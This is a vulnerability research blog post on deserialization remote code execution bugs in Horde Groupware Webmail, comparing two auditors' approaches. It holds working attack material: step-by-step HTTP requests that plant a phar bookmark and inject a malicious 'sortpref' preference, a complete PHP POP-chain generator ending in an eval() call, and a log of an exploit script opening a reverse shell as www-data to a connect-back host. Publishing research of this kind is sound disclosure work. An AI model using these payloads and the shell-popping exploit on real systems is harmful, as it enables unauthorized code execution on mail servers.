---
layout: post
title: "A SmorgasHORDE of Vulnerabilities :: A Comparative Analysis of Discovery"
date: 2020-08-19 09:00:00 -0500
categories: blog
---

![Horde Groupware Webmail](/assets/images/a-smorgashorde-of-vulnerabilities/horde.png "Horde Groupware Webmail") 

Some time ago I performed an audit of the Horde Groupware Webmail suite of applications and found an interesting code pattern that facilitated the attack of 34+ remote code execution vulnerabilities. Additionally, [Andrea Cardaci's performed an audit](https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/) around the same time and we seemed to miss each others bugs due to a difference in auditing styles.
<!--more-->

TL;DR; *In this post, I share the technical details of one Andrea's bugs that I missed and how I missed it. Then I dive into full exploitation of a vulnerability that I found that required several primitives to achieve remote code execution. Hopefully this blog post will demonstrate how obtaining the context of the application's code can provide powerful primitives to defeat developer assumptions.*

## Authentication

Typically speaking, remote code execution vulnerabilities that require authentication don't have a very high impact since an attacker requires sensitive information before gaining access. However, in webmail based applications things are a little different.

These types of applications are often remotely exposed and highly used. Attackers can still (ab)use techniques such as [credential stuffing](https://en.wikipedia.org/wiki/Credential_stuffing), account bruteforce, [phishing](https://en.wikipedia.org/wiki/Phishing) or credential re-use. Once access is gained, the impact is often high, leading to outcomes like leaked [email spools](https://elly.town/m/zines/h0no/h0no.txt).

For example the Microsoft Exchange Validation Key Remote Code Execution Vulnerability ([CVE-2020-0688](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688)) was [exploited in the wild](https://secureteam.co.uk/news/vulnerabilities/exchange-server-rce-exploited-in-the-wild/) and required a domain account before proceeding. Another example was a file disclosure vulnerability affecting Roundcube Webmail ([CVE-2017-16651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16651)) that was exploited in November 2017 requiring valid credentials.

**Therefore a low privileged authenticated user that can execute remote code against a webmail based application is still a critical issue.**

## Backgound

Andrea discovered a local file inclusion ([CVE-2020-8865](https://www.zerodayinitiative.com/advisories/ZDI-20-276/)) and an arbitrary file upload restricted to the /tmp directory ([CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/)). In the same blog post, he mentions two different code paths to the same phar deserialization vulnerability which has no CVE assigned and was left unpatched. Andrea and I discussed this and we came to the conclusion that the developers choose not to patch the phar deserialization issue due the [patch](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6) for [CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/) that prevents planting phar archives. Additionally, I later found out that the `Horde_Http_Request_Fopen` class is not used by default, which i'm positive is the reason why the issue was never patched.

To quote Andrea from his blog post:

> > To use the other approach instead, just bookmark phar:///tmp/exploit.phar then click on it after the upload phase.

What is evident is that his approach to discovering the phar deserialization issues was through black-box auditing which can help reveal context that's mapped to the UI. Whilst white-box auditing is important for discovering a large varient base, it's evident that a black-box approach can still find critical issues where varients can be modelled from.

## Horde Groupware Webmail Trean_Queue_Task_Crawl url Deserialization of Unstrusted Data Remote Code Execution Vulnerability

- Discovered by: Andrea Cardaci
- CVE: N/A
- CVSS: 6.3 [(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))

### Summary

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.

The specific flaw exists within the `Trean_Queue_Task_Crawl` class. When parsing the url parameter the process does not properly validate the user-supplied value prior to using it in file operations that result in deserialization of untrusted data. An attacker can leverage this in conjunction with other vulnerabilities to execute code in the context of the www-data user.

### Attack Flow

This flow can be triggered after a user has logged in and planted a phar archive using CVE-2020-8866:

Stage 1 - Add a bookmark with the url parameter mapping to your malicious phar archive.

```
POST /horde/trean/add.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: Horde=<sessionid>

actionID=add_bookmark&url=phar:///tmp/poc.xyz
```

Stage 2 - Leak the `b` parameter. This is required to trigger stage 3.

```
GET /horde/trean/ HTTP/1.1
Host: <target>
Cookie: Horde=<sessionid>
```

response...

```
...
        <a href="/horde/trean/redirect.php?b=28" target="_blank">phar:///tmp/poc.xyz</a>
```

Stage 3 - Trigger phar deserialization.

```
GET /horde/trean/redirect.php?b=28 HTTP/1.1
Host: <target>
Cookie: Horde=<sessionid>
```

### Vulnerability Analysis

As noted, an attacker can reach the trigger path from the `trean/redirect.php` script:

```php
require_once __DIR__ . '/lib/Application.php';
Horde_Registry::appInit('trean');

$bookmark_id = Horde_Util::getFormData('b');
if (!$bookmark_id) {
    exit;
}

try {
    $bookmark = $trean_gateway->getBookmark($bookmark_id);
    ++$bookmark->clicks;
    $bookmark->save();                                              // 1
    header('Location: ' . Horde::externalUrl($bookmark->url));
} catch (Exception $e) {
}
```

The `save` method is implemented in the `trean/lib/Bookmark.php` script:

```php
class Trean_Bookmark
{

    //...

    public function save($crawl = true)                             // 2
    {
        if (!strlen($this->url)) {
            throw new Trean_Exception('Incomplete bookmark');
        }

        $charset = $GLOBALS['trean_db']->getOption('charset');
        $c_url = Horde_String::convertCharset($this->url, 'UTF-8', $charset);
        $c_title = Horde_String::convertCharset($this->title, 'UTF-8', $charset);
        $c_description = Horde_String::convertCharset($this->description, 'UTF-8', $charset);
        $c_favicon_url = Horde_String::convertCharset($this->favicon_url, 'UTF-8', $charset);

        if ($this->id) {
            // Update an existing bookmark.
            $GLOBALS['trean_db']->update('
                UPDATE trean_bookmarks
                SET user_id = ?,
                    bookmark_url = ?,
                    bookmark_title = ?,
                    bookmark_description = ?,
                    bookmark_clicks = ?,
                    bookmark_http_status = ?,
                    favicon_url = ?
                WHERE bookmark_id = ?',
                array(
                    $this->userId,
                    $c_url,
                    $c_title,
                    $c_description,
                    $this->clicks,
                    $this->http_status,
                    $c_favicon_url,
                    $this->id,
            ));

            $GLOBALS['injector']->getInstance('Trean_Tagger')->replaceTags((string)$this->id, $this->tags, $GLOBALS['registry']->getAuth(), 'bookmark');
        } else {
            // Saving a new bookmark.
            $bookmark_id = $GLOBALS['trean_db']->insert('
                INSERT INTO trean_bookmarks (
                    user_id,
                    bookmark_url,
                    bookmark_title,
                    bookmark_description,
                    bookmark_clicks,
                    bookmark_http_status,
                    favicon_url,
                    bookmark_dt
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                array(
                    $this->userId,
                    $c_url,
                    $c_title,
                    $c_description,
                    $this->clicks,
                    $this->http_status,
                    $c_favicon_url,
                    $this->dt,
            ));

            $this->id = (int)$bookmark_id;
            $GLOBALS['injector']->getInstance('Trean_Tagger')->tag((string)$this->id, $this->tags, $GLOBALS['registry']->getAuth(), 'bookmark');
        }

        if ($crawl) {                                                                   // 3
            try {
                $queue = $GLOBALS['injector']->getInstance('Horde_Queue_Storage');
                $queue->add(new Trean_Queue_Task_Crawl(                                 // 4
                    $this->url,                                                         // 5
                    $this->title,
                    $this->description,
                    $this->id,
                    $this->userId
                ));
            } catch (Exception $e) {
                Horde::log($e, 'INFO');
            }
        }
```

The attacker supplied url is parsed as the first argument to the constructor of the `Trean_Queue_Task_Crawl` class (defined in the `trean/lib/Queue/Task/Crawl.php` script) and the created instance is added to a queue. Classes that are added to a queue have their `run` method triggered:

```php
class Trean_Queue_Task_Crawl implements Horde_Queue_Task
{

    //...

    public function __construct($url, $userTitle, $userDesc, $bookmarkId, $userId)
    {
        $this->_url = $url;
        $this->_userTitle = $userTitle;
        $this->_userDesc = $userDesc;
        $this->_bookmarkId = $bookmarkId;
        $this->_userId = $userId;
    }

    /**
     */
    public function run()
    {
        $injector = $GLOBALS['injector'];

        // Get Horde_Http_Client
        $client = $injector->getInstance('Horde_Http_Client');

        // Fetch full text of $url
        try {
            $page = $client->get($this->_url);                                          // 6
```

At *[6]* the code calls the `get` method from a `Horde_Http_Client` instance. This class is defined in `/usr/share/php/Horde/Http/Client.php` script:

```php
class Horde_Http_Client
{

    //...

    public function get($uri = null, $headers = array())
    {
        return $this->request('GET', $uri, null, $headers);
    }

    //...

    public function request(
        $method, $uri = null, $data = null, $headers = array()
    )
    {
        if ($method !== null) {
            $this->request->method = $method;
        }
        if ($uri !== null) {
            $this->request->uri = $uri;
        }
        if ($data !== null) {
            $this->request->data = $data;
        }
        if (count($headers)) {
            $this->request->setHeaders($headers);
        }

        $this->_lastRequest = $this->_request;
        $this->_lastResponse = $this->_request->send();                                 // 7

        return $this->_lastResponse;
    }
```

Several classes that extend the `Horde_Http_Request_Base` class implement the `send` method that is triggered at *[7]*:

```sh
researcher@target:/var/www/horde$ grep -sir "function send(" /usr/share/php/Horde/Http/Request/
/usr/share/php/Horde/Http/Request/Mock.php:    public function send()
/usr/share/php/Horde/Http/Request/Curl.php:    public function send()
/usr/share/php/Horde/Http/Request/Base.php:    abstract public function send();
/usr/share/php/Horde/Http/Request/Peclhttp.php:    public function send()
/usr/share/php/Horde/Http/Request/Fopen.php:    public function send()
/usr/share/php/Horde/Http/Request/Peclhttp2.php:    public function send()
```

We can determine which implementation is used statically by investigating the `Horde_Http_Request_Factory` class defined in the `/usr/share/php/Horde/Http/Request/Factory.php` file:

```php
    public function create()
    {
        if (class_exists('HttpRequest', false)) {
            return new Horde_Http_Request_Peclhttp();                    // 1
        } elseif (class_exists('\http\Client', false)) {
            return new Horde_Http_Request_Peclhttp2();                   // 2
        } elseif (extension_loaded('curl')) {
            return new Horde_Http_Request_Curl();                        // 3
        } elseif (ini_get('allow_url_fopen')) {
            return new Horde_Http_Request_Fopen();                       // 4
        } else {
            // ...
        }
    }
```

By default, *[1]* and *[2]* are not installed. When installing from the pear server ([the default installation](https://www.horde.org/apps/horde/docs/INSTALL#installing-with-pear)), *[3]* is installed. We can verify this by adding a `die(var_dump($this->_request))` to the `request` method, dumping the instance object at runtime:

```php
object(Horde_Http_Request_Curl)#210 (3) {
  ["_httpAuthSchemes":protected]=>
  array(5) {
    ["ANY"]=>
    int(-17)
    ["BASIC"]=>
    int(1)
    ["DIGEST"]=>
    int(2)
    ["GSSNEGOTIATE"]=>
    int(4)
    ["NTLM"]=>
    int(8)
  }
  ["_headers":protected]=>
  array(0) {
  }
  ["_options":protected]=>
  array(16) {
    ["uri"]=>
    string(21) "phar:///tmp/poc.phar"
    ["method"]=>
    string(3) "GET"
    ["data"]=>
    NULL
    ["username"]=>
    string(0) ""
    ["password"]=>
    string(0) ""
    ["authenticationScheme"]=>
    string(3) "ANY"
    ["proxyServer"]=>
    NULL
    ["proxyPort"]=>
    NULL
    ["proxyType"]=>
    int(0)
    ["proxyUsername"]=>
    NULL
    ["proxyPassword"]=>
    NULL
    ["proxyAuthenticationScheme"]=>
    string(5) "BASIC"
    ["redirects"]=>
    int(5)
    ["timeout"]=>
    int(5)
    ["userAgent"]=>
    string(16) "Horde_Http 2.1.7"
    ["verifyPeer"]=>
    bool(true)
  }
}
```

Therefore if the `php-curl` extension **_IS_** installed, then its not possible to exploit this bug. Only non-default setups are vulnerable because they *can* reach the `send` method of the `Horde_Http_Request_Fopen` class at *[4]*.

```php

    public function send()
    {
        $method = $this->method;
        $uri = (string)$this->uri;

        //...

        // fopen() requires a protocol scheme
        if (parse_url($uri, PHP_URL_SCHEME) === null) {
            $uri = 'http://' . $uri;
        }

        //...

        $stream = fopen($uri, 'rb', false, $context);                  // triggers phar deserialization here

        //...
```

This is an interesting code pattern I have seen several times in PHP applications that need to implement a client downloader.

### How I Missed the Phar and Portal Bugs

Playing around with the GUI and throwing in URI's looking for an SSRF would have found this Phar deserialization issue. Also, by performing heavy code analysis, I had forgotten to audit the classes extending the `Horde_Core_Block` class since I couldn't find a direct way to trigger their instantiation and usage at the time. By adding widgets into the portal interface, I would have discovered how the `Horde_Core_Block` classes could have been reached!

As a friend once asked me: *do you even known what the GUI looks like?*

## Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability

- Discovered by: mr_me
- CVE: N/A
- CVSS: 6.3 [(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))

### Summary

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.

The specific flaw exists within `Sort.php`. When parsing the sortpref parameter, the process does not properly validate user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the www-data user.

### Vulnerability Analysis

There are more than meets the eye to this large application (or group of applications rather). To understand this bug in depth, it will make sense to present it first and then explain the primitives required to reach and exploit it.

It's possible to reach a second order deserialization of untrusted data in the `IMP_Prefs_Sort` class constructor defined in the `imp/lib/Prefs/Sort.php` script:

```php
class IMP_Prefs_Sort implements ArrayAccess, IteratorAggregate
{
    /* Preference name in backend. */
    const SORTPREF = 'sortpref';

    /**
     * The sortpref value.
     *
     * @var array
     */
    protected $_sortpref = array();

    /**
     * Constructor.
     */
    public function __construct()
    {
        global $prefs;

        $sortpref = @unserialize($prefs->getValue(self::SORTPREF));             // 1
        if (is_array($sortpref)) {
            $this->_sortpref = $sortpref;
        }
    }
```

At first, this seems almost impossible to reach. Let's break down what is required to exploit this vulnerability and then deal with them one by one:

*1. Preference Control:*

An attacker needs to be able to set the `sortpref` preference. These preferences are a per application setting and are stored in the database.

*2. Object Instantiation:*

The bug we are trying to reach is in the `__construct` method and the way to get that method fired, is to find a code path that calls `new` on the `IMP_Prefs_Sort` class or find a code path where we can control the class name to a `new` call.

*3. Property Oriented Programming (POP) Chain:*

We need something to unserialize that will do something dangerous, you know, like remote code execution.

## The Primitives

### Preference Control:

Before we can trigger the object instantiation, thus the deserialization of untrusted data, we need to be able to set the preference to a malicious serialized PHP object. One thing to note is that inside the `IMP_Prefs_Sort` class, the `$prefs` variable is set to `global`. This indicates to us that their *must* be another location where that variable can be modified.

From the GUI, Horde Groupware Webmail exposes a way to set preferences for an application using the `services/prefs.php` script. The issue with that however, is that a user doesn't have control of *all of the preferences*. For example, a typical preference request might look like:

```
POST /horde/services/prefs.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Cookie: Horde=<sessionid>

horde_prefs_token=<csrftoken>&actionID=update_prefs&group=searches&app=imp&searches_action=1
```

That's not going to cut it, we need something more specific and granular. As it turns out, several ajax handlers in different applications register the `setPrefValue` method from the `Horde_Core_Ajax_Application_Handler_Prefs` class. This particular ajax handler is not exposed from the GUI.

```sh
researcher@target:/var/www/horde$ grep -sir "Horde_Core_Ajax_Application_Handler_Prefs" .
./imp/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
./mnemo/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
./trean/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
./kronolith/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
./nag/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
```

Since the `IMP_Prefs_Sort` class is within the `imp` application, I opted to use the `IMP_Ajax_Application` class so that I can set the preference for the `imp` (since preferences are application specific). Inside of the `Horde_Core_Ajax_Application_Handler_Prefs` class, we can see the `setPrefValue` method definition:

```php
class Horde_Core_Ajax_Application_Handler_Prefs extends Horde_Core_Ajax_Application_Handler
{
    /**
     * Sets a preference value.
     *
     * Variables used:
     *   - pref: (string) The preference name.
     *   - value: (mixed) The preference value.
     *
     * @return boolean  True on success.
     */
    public function setPrefValue()
    {
        return $GLOBALS['prefs']->setValue(
            $this->vars->pref,
            $this->vars->value
        );
    }

}
```

Therefore, in order for us to set the `sortpref` preference for the `imp` application, we can use the following request:

```
GET /horde/services/ajax.php/imp/setPrefValue?pref=sortpref&value=junk&token=<csrftoken> HTTP/1.1
Host: <target>
Cookie: Horde=<sessionid>
```

Which returns the following response on success:

```
HTTP/1.1 200 OK
...
Content-Length: 29
Content-Type: application/json

/*-secure-{"response":true}*/
```

After using the `Horde_Core_Ajax_Application_Handler_Prefs` ajax handler, we can view the preference in the database:

```sh
MariaDB [horde]> select pref_value from horde_prefs where pref_uid='hordeuser' and pref_name='sortpref';
+------------+
| pref_value |
+------------+
| junk       |
+------------+
1 row in set (0.00 sec)
```

### Object Instantiation:

Lucky for us, it's also possible to reach the constructor of the `IMP_Prefs_Sort` class because I found an ajax handler called `imple` that will allow me to instantiate a class. The limitation here is that I can only instantiate a class with an empty constructor. The `imple` method is defined inside of the `/usr/share/php/Horde/Core/Ajax/Application/Handler/Imple.php` script:

```php
class Horde_Core_Ajax_Application_Handler_Imple extends Horde_Core_Ajax_Application_Handler
{
    /**
     * AJAX action: Run imple.
     *
     * Parameters needed:
     *   - app: (string) Imple application.
     *   - imple: (string) Class name of imple.
     */
    public function imple()
    {
        global $injector, $registry;

        $pushed = $registry->pushApp($this->vars->app);
        $imple = $injector->getInstance('Horde_Core_Factory_Imple')->create($this->vars->imple, array(), true);       // 1

        $result = $imple->handle($this->vars);

        if ($pushed) {
            $registry->popApp();
        }

        return $result;
    }

}
```

The code calls `create` using the attacker controlled `$this->vars->imple` which becomes the driver for a new class. Inside of the `/usr/share/php/Horde/Core/Factory/Imple.php` script we can see the definition of `Horde_Core_Factory_Imple` that reveals the instantiation:

```php
class Horde_Core_Factory_Imple extends Horde_Core_Factory_Base
{
    /**
     * Attempts to return a concrete Imple instance.
     *
     * @param string $driver     The driver name.
     * @param array $params      A hash containing any additional
     *                           configuration or parameters a subclass might
     *                           need.
     * @param boolean $noattach  Don't attach on creation.
     *
     * @return Horde_Core_Ajax_Imple  The newly created instance.
     * @throws Horde_Exception
     */
    public function create($driver, array $params = array(),
                           $noattach = false)
    {
        $class = $this->_getDriverName($driver, 'Horde_Core_Ajax_Imple');        // 2

        $ob = new $class($params);                                               // 4
```

```php
    protected function _getDriverName($driver, $base)
    {
        /* Intelligent loading... if we see at least one separator character
         * in the driver name, guess that this is a full classname so try that
         * option first. */
        $search = (strpbrk($driver, '\\_') === false)
            ? array('driver', 'class')
            : array('class', 'driver');

        foreach ($search as $val) {
            switch ($val) {
            case 'class':
                if (class_exists($driver)) {
                    return $driver                                                // 3
```

Inside of the `Horde_Core_Factory_Base` class, the `_getDriverName` method is implemented and at *[3]* this method returns the attacker supplied `$driver` variable if it's a valid class (it can be any class in scope). Finally at *[4]* object instantiation is triggered using the empty constructor (since `$params` is empty).

The trigger for the object instantiation and thus, the deserialization of untrusted data is:
```
GET /horde/services/ajax.php/imp/imple?imple=IMP_Prefs_Sort&app=imp&token=<csrftoken> HTTP/1.1
Host: <target>
Cookie: Horde=<sessionid>
```

### The POP Chain

The final piece to the puzzle, is a serialized PHP object chain that will execute arbitrary remote code. My initial proof of concept used the `Horde_Auth_Passwd` class to rename a file on the local filesystem for remote code execution. However there were several limitations to this technique such as needing to upload a file onto the target system (to rename) and knowledge of the webroot path.

In the end I decided to use the `Horde_Kolab_Server_Decorator_Clean` class. This the same POP chain as used in CVE-2014-1691 by [EgiX](http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection) but I had to make several changes due to the way php 7+ uses Serializable interfaces and the changes that occured to the classes over 5+ years.

One of the major changes to the chain was that the `Horde_Prefs_Scope` class implements `Serializable`. This could be compared to Java's `Externalizable` interface, whereby it allows a programmer to serialize only certain properties. Lucky for us, the properties that we are (ab)using are serialized! Let's break down this monster of a chain.

```php
class Horde_Kolab_Server_Decorator_Clean {

    public function delete($guid)
    {
        $this->_server->delete($guid);                                     // 3
        if (in_array($guid, $this->_added)) {
            $this->_added = array_diff($this->_added, array($guid));
        }
    }

    public function cleanup()
    {
        foreach ($this->_added as $guid) {
            $this->delete($guid);                                          // 2
        }
    }

    /**
     * Destructor.
     */
    public function __destruct()
    {
        try {
            $this->cleanup();                                              // 1
        } catch (Horde_Kolab_Server_Exception $e) {
        }
    }

}
```

The `__destruct` method calls `cleanup` at *[1]*, which calls `delete` at *[2]* and then `$this->_server->delete` is called at *[3]*.

```php
class Horde_Prefs_Identity {

    public function save()
    {
        $this->_prefs->setValue($this->_prefnames['identities'], serialize($this->_identities));   // 6
        $this->_prefs->setValue($this->_prefnames['default_identity'], $this->_default);
    }

    public function delete($identity)
    {
        $deleted = array_splice($this->_identities, $identity, 1);

        if (!empty($deleted)) {                                                                    // 4
            foreach (array_keys($this->_identities) as $id) {
                if ($this->setDefault($id)) {
                    break;
                }
            }
            $this->save();                                                                         // 5
        }

        return reset($deleted);
    }
}
```

We can set the `$this->_server` property to `Horde_Prefs_Identity` to reach its `delete` method. The call to `array_splice` needs to return a value so that at *[4]* we can reach the `save` call at *[5]*. To achieve this, I just set the `$this->_identities` property on the `Horde_Prefs_Identity` class. Once `save` is called, we can reach *[6]* which is a call to `setValue` on a property.

```php
class Horde_Prefs implements ArrayAccess
{
    /* The default scope name. */
    const DEFAULT_SCOPE = 'horde';

    public function setValue($pref, $val, array $opts = array())
    {
        /* Exit early if preference doesn't exist or is locked. */
        if (!($scope = $this->_getScope($pref)) ||                                // 7
            (empty($opts['force']) &&
             $this->_scopes[$scope]->isLocked($pref))) {
            return false;
        }

        // Check to see if the value exceeds the allowable storage limit.
        if ($this->_opts['sizecallback'] &&
            call_user_func($this->_opts['sizecallback'], $pref, strlen($val))) {  // 9
            return false;
        }
        ...
    }

    protected function _getScope($pref)
    {
        $this->_loadScope($this->_scope);

        if ($this->_scopes[$this->_scope]->exists($pref)) {
            return $this->_scope;
        } elseif ($this->_scope != self::DEFAULT_SCOPE) {
            $this->_loadScope(self::DEFAULT_SCOPE);
            if ($this->_scopes[self::DEFAULT_SCOPE]->exists($pref)) {
                return self::DEFAULT_SCOPE;                                       // 8
            }
        }

        return null;
    }

    protected function _loadScope($scope)
    {
        // Return if we've already loaded these prefs.
        if (!empty($this->_scopes[$scope])) {
            return;
        }
        ...
    }
}
```

At *[7]* `setValue` will call `_getScope` which will return the default scope at *[8]*. Once that check is passed, we can reach the `call_user_func` method at *[9]* with an attacker controlled `_opts['sizecallback']`. Leveraging this, we can target the `readXMLConfig` method of the `Horde_Config` class for an unprotected `eval()` at *[10]*.

```php
class Horde_Config
{

    public function readXMLConfig($custom_conf = null)
    {
        if (!is_null($this->_xmlConfigTree) && !$custom_conf) {
            return $this->_xmlConfigTree;
        }

        $path = $GLOBALS['registry']->get('fileroot', $this->_app) . '/config';

        if ($custom_conf) {
            $this->_currentConfig = $custom_conf;
        } else {
            /* Fetch the current conf.php contents. */
            @eval($this->getPHPConfig());                                             // 10
            if (isset($conf)) {
                $this->_currentConfig = $conf;
            }
        }
        ...
    }

    public function getPHPConfig()
    {
        if (!is_null($this->_oldConfig)) {
            return $this->_oldConfig;
        }
        ...
    }
    ...
}
```

It was not lost on me, that we are (ab)using the `Horde_Prefs` class for the deserialization chain either!

### Proof of Concept

Here is the completed POP chain I used:

```php
<?php

class Horde_Config
{
   protected $_oldConfig = "phpinfo();die;";
}

class Horde_Prefs_Scope implements Serializable
{
    protected $_prefs = array(1);
    protected $scope;

    public function serialize()
    {
        return json_encode(array(
            $this->scope,
            $this->_prefs
        ));
    }

    public function unserialize($data)
    {
        list($this->scope, $this->_prefs) = json_decode($data, true);
    }
}

class Horde_Prefs
{
   protected $_opts, $_scopes;

   function __construct()
   {
      $this->_opts['sizecallback'] = array(new Horde_Config, 'readXMLConfig');
      $this->_scopes['horde'] = new Horde_Prefs_Scope;
   }
}

class Horde_Prefs_Identity
{

   protected $_prefs, $_prefnames, $_identities;
   function __construct()
   {
      $this->_identities = array(0);
      $this->_prefs = new Horde_Prefs;
      $this->_prefnames['identities'] = 0;
   }
}

class Horde_Kolab_Server_Decorator_Clean
{
   private $_server, $_added;
   function __construct()
   {
      $this->_added = array(0);
      $this->_server = new Horde_Prefs_Identity;
   }
}

$popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);
echo $popchain;
```

...and finally icing on the cake:

```sh
saturn:~ mr_me$ ./poc.py 
(+) usage ./poc.py <target> <path> <user:pass> <connectback:port>
(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337

saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
(+) targeting http://172.16.175.145/horde/
(+) obtained session iefankvohbl8og0mtaadm3efb6
(+) inserted our php object
(+) triggering deserialization...
(+) starting handler on port 1337
(+) connection from 172.16.175.145
(+) pop thy shell!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/horde/services
uname -a
Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
exit
*** Connection closed by remote host ***
(+) repaired the target!
```

You can download the complete exploit [here](/pocs/zdi-20-1051.py.txt).

## Conclusions

Complex applications need both a white-box review *and* a black-box review to provide complete context to an auditor. Knowledge if the underlying framework and code is nice, but it can be very difficult to find the code path to a bug if context and understanding is not achieved. Continuing to discover and develop black-box finger printing techniques is very important for subtle and high impact vulnerability classes.

## References

- [http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection](http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection)
- [https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/](https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/)
- [https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6))